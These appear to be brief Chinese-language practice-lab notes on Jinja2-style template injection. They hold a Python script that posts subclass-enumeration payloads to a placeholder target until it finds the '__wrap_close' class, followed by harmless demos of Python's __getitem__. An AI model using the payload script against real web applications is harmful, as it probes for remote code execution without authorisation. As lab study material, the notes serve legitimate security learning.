### py脚本查找`__wrap_close`模块

```python

import requests

url = "靶场ip"

for i in range(500):
	data = {"code": '{{"".__class__.__base__.__subclasses__().__getitem__('+str(i)+')}}'}
	try:
		response = requests.post(url, data=data)
		if response.status_code == 200:
			if "__wrap_close" in response.text:
				print(i, "--->", response.text)
				break
				
	except:
		pass
```

## 关于`getitem()`的代码示例
---

```python
"""demo1.py"""
class test():
	def __init__(self):
		self.a = {
			'1': 'zhangsan',
			'2': 'lisi',
			'3': 'wangwu'
		}
		
	def getitem(self, key):
		return self.a[key]
		
t = test()
print(t.getitem('2'))
# => lisi


"""demo2.py"""
class test():
	def __init__(self):
		self.a = {
			'1': 'zhangsan',
			'2': 'lisi',
			'3': 'wangwu'
		}
		
	def __getitem__(self, key):
		return self.a[key]
		
t = test()
print(t['2'])
# => lisi
```
